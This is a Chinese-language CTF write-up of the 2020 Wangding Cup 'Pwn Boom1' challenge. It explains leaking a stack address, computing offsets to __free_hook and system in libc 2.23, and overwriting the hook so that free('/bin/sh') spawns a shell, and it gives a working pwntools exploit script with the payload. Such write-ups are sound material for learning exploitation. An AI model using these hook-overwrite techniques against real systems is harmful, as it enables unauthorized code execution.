---
title: "WDCUP2020 Pwn Boom1"
date: 2020-05-13T23:03:22+08:00
author: NiceSeven
categories:
  - WDCUP2020
tags:
  - Pwn
---

# 2020网鼎杯 Pwn Boom1

考点：

1、VM

2、C语言指针

我们可以输入c语言代码，以；结束，需要有main(){}，并且主函数内只能执行一次函数

思路：

定义个int a，然后printf("%p",&a)打印出a的地址，然后用gdb调试找到__free_hook和system相对&a的偏移，以&a为基计算\_\_free_hook和system的地址，然后覆盖\_\_free_hook为system地址，执行free("/bin/sh")来getshell

为了更快的找到\_\_free_hook和system的地址，我们需要知道libc版本

![image-20200513231446033](D:\Github\myblog\static\images\image-20200513231446033.png)

打印出&a的地址

![image-20200513231532772](D:\Github\myblog\static\images\image-20200513231532772.png)

计算&a到显示libc版本号的地址偏移，-7251476

![image-20200513231614478](D:\Github\myblog\static\images\image-20200513231614478.png)

但是这里定义a为int类型地址8字节为单位，所以-7251476/8=-906434才是实际偏移

![image-20200513232241308](D:\Github\myblog\static\images\image-20200513232241308.png)

因为是字符串所以偏移地址需要微调为-906435，才能puts出2.23，当然这里也可用char a来定义偏移就不需要除以8了

![image-20200513232601953](D:\Github\myblog\static\images\image-20200513232601953.png)

我们知道libc为2.23了，然后就是计算free_hook和system相对与&a的偏移了

![image-20200513233715110](D:\Github\myblog\static\images\image-20200513233715110.png)

利用pwntools中的ELF模块，得出libc.so.6中free_hook和system的偏移，然后用实际的基地址来相加得出准确地址

![image-20200513233825499](D:\Github\myblog\static\images\image-20200513233825499.png)

然后利用得到的&a地址来distance计算偏移

![image-20200513233902720](D:\Github\myblog\static\images\image-20200513233902720.png)

![image-20200513234038038](D:\Github\myblog\static\images\image-20200513234038038.png)

&a-3553328 -> __free_hook

&a-7084680 -> system

![image-20200513234555081](D:\Github\myblog\static\images\image-20200513234555081.png)

因为我们覆盖的__free_hook有8字节，所以我们定义一个int a来传数据，同时偏移也都要除以8，当然用char也可以强制装换为int指针(int*)来覆盖hook，但是偏移还是要除以8，所以直接用int比较好

```python
from pwn import *
p = process(["/tmp/ld-2.23.so", "./pwn1"], env={"LD_PRELOAD":"libc.so.6"})
libc = ELF('./libc.so.6')
#p=process('./pwn1')
context.terminal = ['tmux', 'sp', '-h']
context.log_level ='debug'

print ("libc:__free_hook " + hex(libc.symbols['__free_hook']))
print ("libc:system " + hex(libc.symbols['system']))

gdb.attach(p)
#payload = '''main(){char a;puts(&a-7251476);}'''#用来leak libc版本
#payload = '''main(){int a;printf("%p ",&a);}'''#用来hook和system计算相对a地址的偏移
#*(&a-444166)->__free_hook
#&a-885585->system
#含义就是覆盖__free_hook->system，这样在free的时候就是执行system
payload = '''main(){int a;*(&a-444166)=&a-885585;free("/bin/sh");}'''
#payload = '''main(){char a;*((int*)&a-444166)=&a-885585;free("/bin/sh");}'''
payload = payload.replace('\n','')
#gdb.attach(p)

p.sendlineafter("I'm living...",payload)
p.interactive()
```

总结：

这里因为VM程序malloc了一段很大的空间，所以申请到了mmap中，经过调试后知道__free_hook的位置在glibc的下面的mmap中

![image-20200514000222639](D:\Github\myblog\static\images\image-20200514000222639.png)